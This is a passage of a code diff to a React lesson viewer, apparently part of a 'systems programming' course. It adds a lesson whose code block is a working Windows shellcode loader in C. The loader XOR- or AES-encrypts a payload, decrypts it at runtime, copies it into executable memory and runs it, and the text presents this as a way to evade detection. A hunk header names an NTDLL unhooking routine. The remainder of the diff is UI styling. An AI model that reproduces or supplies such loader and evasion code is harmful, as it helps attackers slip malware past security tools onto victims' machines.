+• Evades size-based detection`,
+          code: `#include <windows.h>
+#include <stdio.h>
+#include <wincrypt.h>
+
+// XOR Encoder/Decoder (simplest)
+void XOREncode(BYTE* data, SIZE_T size, BYTE key) {
+    for (SIZE_T i = 0; i < size; i++) {
+        data[i] ^= key;
+    }
+}
+
+// Multi-byte XOR
+void XOREncodeMulti(BYTE* data, SIZE_T size, 
+                    BYTE* key, SIZE_T keyLen) {
+    for (SIZE_T i = 0; i < size; i++) {
+        data[i] ^= key[i % keyLen];
+    }
+}
+
+// Generate XOR decoder stub
+void GenerateXORDecoder(BYTE key) {
+    printf("; XOR Decoder Stub (NASM)\\n");
+    printf("decoder_start:\\n");
+    printf("    lea rsi, [rel shellcode]\\n");
+    printf("    mov rcx, shellcode_len\\n");
+    printf("decode_loop:\\n");
+    printf("    xor byte [rsi], 0x%02X\\n", key);
+    printf("    inc rsi\\n");
+    printf("    loop decode_loop\\n");
+    printf("    jmp shellcode\\n");
+    printf("shellcode:\\n");
+    printf("    ; Encoded shellcode here\\n");
+}
+
+// AES encryption for shellcode
+BOOL AESEncrypt(BYTE* pData, DWORD dwDataLen,
+                BYTE* pKey, DWORD dwKeyLen,
+                BYTE** ppEncrypted, DWORD* pdwEncLen) {
+    
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hKey = 0;
+    HCRYPTHASH hHash = 0;
+    BOOL bResult = FALSE;
+    
+    // Acquire context
+    if (!CryptAcquireContextA(&hProv, NULL, NULL,
+        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        return FALSE;
+    }
+    
+    // Create hash of key
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 
+        0, 0, &hHash)) {
+        goto cleanup;
+    }
+    
+    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
+        goto cleanup;
+    }
+    
+    // Derive AES key
+    if (!CryptDeriveKey(hProv, CALG_AES_256, 
+        hHash, 0, &hKey)) {
+        goto cleanup;
+    }
+    
+    // Allocate output buffer (size + padding)
+    DWORD dwEncLen = dwDataLen + AES_BLOCK_SIZE;
+    BYTE* pEncrypted = (BYTE*)malloc(dwEncLen);
+    memcpy(pEncrypted, pData, dwDataLen);
+    
+    // Encrypt
+    DWORD dwSize = dwDataLen;
+    if (!CryptEncrypt(hKey, 0, TRUE, 0, 
+        pEncrypted, &dwSize, dwEncLen)) {
+        free(pEncrypted);
+        goto cleanup;
+    }
+    
+    *ppEncrypted = pEncrypted;
+    *pdwEncLen = dwSize;
+    bResult = TRUE;
+    
+cleanup:
+    if (hKey) CryptDestroyKey(hKey);
+    if (hHash) CryptDestroyHash(hHash);
+    if (hProv) CryptReleaseContext(hProv, 0);
+    
+    return bResult;
+}
+
+// Runtime decryption
+BOOL AESDecrypt(BYTE* pEncrypted, DWORD dwEncLen,
+                BYTE* pKey, DWORD dwKeyLen,
+                BYTE** ppDecrypted, DWORD* pdwDecLen) {
+    
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hKey = 0;
+    HCRYPTHASH hHash = 0;
+    BOOL bResult = FALSE;
+    
+    if (!CryptAcquireContextA(&hProv, NULL, NULL,
+        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        return FALSE;
+    }
+    
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 
+        0, 0, &hHash)) {
+        goto cleanup;
+    }
+    
+    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
+        goto cleanup;
+    }
+    
+    if (!CryptDeriveKey(hProv, CALG_AES_256, 
+        hHash, 0, &hKey)) {
+        goto cleanup;
+    }
+    
+    // Allocate and decrypt
+    BYTE* pDecrypted = (BYTE*)malloc(dwEncLen);
+    memcpy(pDecrypted, pEncrypted, dwEncLen);
+    
+    DWORD dwSize = dwEncLen;
+    if (!CryptDecrypt(hKey, 0, TRUE, 0, 
+        pDecrypted, &dwSize)) {
+        free(pDecrypted);
+        goto cleanup;
+    }
+    
+    *ppDecrypted = pDecrypted;
+    *pdwDecLen = dwSize;
+    bResult = TRUE;
+    
+cleanup:
+    if (hKey) CryptDestroyKey(hKey);
+    if (hHash) CryptDestroyHash(hHash);
+    if (hProv) CryptReleaseContext(hProv, 0);
+    
+    return bResult;
+}
+
+// Complete example: Encrypted shellcode loader
+int main() {
+    // Original shellcode (calc.exe example)
+    BYTE shellcode[] = {
+        0x90, 0x90, 0x90,  // NOP sled
+        // ... actual shellcode
+    };
+    
+    DWORD shellcodeLen = sizeof(shellcode);
+    
+    // Encryption key
+    BYTE key[] = "MySecretKey123!";
+    DWORD keyLen = sizeof(key) - 1;
+    
+    // Encrypt
+    BYTE* pEncrypted = NULL;
+    DWORD dwEncLen = 0;
+    
+    if (!AESEncrypt(shellcode, shellcodeLen,
+        key, keyLen, &pEncrypted, &dwEncLen)) {
+        printf("[-] Encryption failed\\n");
+        return 1;
+    }
+    
+    printf("[+] Encrypted %d bytes -> %d bytes\\n",
+           shellcodeLen, dwEncLen);
+    
+    // At runtime: decrypt and execute
+    BYTE* pDecrypted = NULL;
+    DWORD dwDecLen = 0;
+    
+    if (!AESDecrypt(pEncrypted, dwEncLen,
+        key, keyLen, &pDecrypted, &dwDecLen)) {
+        printf("[-] Decryption failed\\n");
+        return 1;
+    }
+    
+    printf("[+] Decrypted %d bytes\\n", dwDecLen);
+    
+    // Allocate executable memory
+    LPVOID pExec = VirtualAlloc(NULL, dwDecLen,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+    
+    memcpy(pExec, pDecrypted, dwDecLen);
+    
+    // Execute
+    ((void(*)())pExec)();
+    
+    // Cleanup
+    VirtualFree(pExec, 0, MEM_RELEASE);
+    free(pDecrypted);
+    free(pEncrypted);
+    
+    return 0;
+}
+
+#pragma comment(lib, "advapi32.lib")`,
+          language: "c"
+        }
+      ]
     }
   };
 
@@ -2353,33 +4677,53 @@ BOOL UnhookNtdll() {
 
   if (!currentLesson) {
     return (
-      <Card className="p-6 bg-card border-border">
-        <p className="text-muted-foreground">Select a module to begin learning.</p>
+      <Card className="p-8 bg-gradient-to-br from-card to-card/50 border-border/50 backdrop-blur">
+        <div className="text-center space-y-4">
+          <BookOpen className="h-16 w-16 text-muted-foreground/50 mx-auto" />
+          <p className="text-lg text-muted-foreground">Select a module to begin your journey into systems programming</p>
+          <p className="text-sm text-muted-foreground/70">Each module contains theory, practical examples, and working code</p>
+        </div>
       </Card>
     );
   }
 
   return (
-    <Card className="h-[600px] flex flex-col bg-card border-border">
-      <div className="p-4 border-b border-border flex items-center gap-2">
-        <BookOpen className="h-5 w-5 text-primary" />
-        <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
+    <Card className="h-[600px] flex flex-col bg-card border-border shadow-lg">
+      <div className="p-4 border-b border-border/50 flex items-center gap-3 bg-gradient-to-r from-primary/5 to-transparent">
+        <div className="p-2 rounded-lg bg-primary/10">
+          <BookOpen className="h-5 w-5 text-primary" />
+        </div>
+        <div className="flex-1">
+          <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
+          <p className="text-xs text-muted-foreground">{currentLesson.sections.length} sections</p>
+        </div>
       </div>
       
       <ScrollArea className="flex-1 p-6">
-        <div className="space-y-8">
+        <div className="space-y-10">
           {currentLesson.sections.map((section: any, idx: number) => (
-            <div key={idx} className="space-y-3">
-              <h4 className="text-lg font-semibold text-foreground">{section.title}</h4>
-              <p className="text-sm text-muted-foreground whitespace-pre-line leading-relaxed">{section.content}</p>
+            <div key={idx} className="space-y-4 group">
+              <div className="flex items-start gap-3">
+                <div className="mt-1 w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center text-sm font-bold text-primary shrink-0">
+                  {idx + 1}
+                </div>
+                <div className="flex-1">
+                  <h4 className="text-lg font-semibold text-foreground mb-2">{section.title}</h4>
+                  <div className="prose prose-sm max-w-none">
+                    <p className="text-sm text-muted-foreground whitespace-pre-line leading-relaxed">{section.content}</p>
+                  </div>
+                </div>
+              </div>
               
               {section.code && (
-                <div className="relative">
-                  <Badge className="absolute top-2 right-2 text-xs">
-                    {section.language}
-                  </Badge>
-                  <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-xs">
-                    <code className="text-foreground font-mono whitespace-pre">{section.code}</code>
+                <div className="relative ml-11 group-hover:shadow-lg transition-shadow duration-200">
+                  <div className="absolute top-3 right-3 z-10">
+                    <Badge variant="secondary" className="text-xs font-mono">
+                      {section.language}
+                    </Badge>
+                  </div>
+                  <pre className="bg-muted/50 backdrop-blur p-5 rounded-lg overflow-x-auto text-xs border border-border/50">
+                    <code className="text-foreground font-mono whitespace-pre leading-relaxed">{section.code}</code>
                   </pre>
                 </div>
               )}
